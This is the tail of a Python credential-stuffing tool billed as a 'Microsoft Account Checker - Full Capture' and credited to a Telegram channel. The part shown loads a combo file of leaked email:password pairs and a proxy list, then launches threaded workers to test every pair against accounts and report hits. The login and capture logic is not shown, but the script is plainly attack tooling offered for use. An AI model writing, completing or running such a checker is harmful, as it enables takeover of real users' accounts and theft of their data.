║              MICROSOFT ACCOUNT CHECKER - FULL CAPTURE                ║
║                                                                      ║
║  Developer: @pyabrodie                                               ║
║  Channel: https://t.me/machitools                                    ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
    {Style.RESET_ALL}""")

    # Load combo file
    combo_file = input(f"{Fore.YELLOW}[+] Combo File: {Style.RESET_ALL}").strip()
    
    if not os.path.exists(combo_file):
        print(f"{Fore.RED} [-] Combo file not found!{Style.RESET_ALL}")
        return

    try:
        with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        print(f"{Fore.RED} [-] Error reading combo file: {e}{Style.RESET_ALL}")
        return
    
    if not combos:
        print(f"{Fore.RED} [-] No valid combos found!{Style.RESET_ALL}")
        return

    stats['total_combos'] = len(combos)
    
    # Load proxies
    proxy_list = load_proxies()

    # Create queue
    combo_queue = queue.Queue()
    for combo in combos:
        combo_queue.put(combo)

    print(f"{Fore.GREEN} [+] Starting checker with {stats['total_combos']} combos and {MAX_THREADS} threads...{Style.RESET_ALL}\n")
    
    display_stats_table()

    # Start worker threads
    threads = []
    worker_count = min(MAX_THREADS, stats['total_combos'])
    if worker_count == 0 and stats['total_combos'] > 0:
        worker_count = 1

    for _ in range(worker_count):
        thread = threading.Thread(target=worker, args=(combo_queue, proxy_list))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    try:
        # Wait for completion
        while stats['checked'] < stats['total_combos']:
            if combo_queue.empty() and all(not t.is_alive() for t in threads):
                break
            time.sleep(0.2)
        
        # Join threads
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=REQUEST_TIMEOUT * 2)

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW} [!] Interrupted by user.{Style.RESET_ALL}")
    
    print("\n" + Style.BRIGHT + Fore.GREEN + "Checker finished." + Style.RESET_ALL)
    display_stats_table()
    print("\n")


if __name__ == "__main__":
    main()
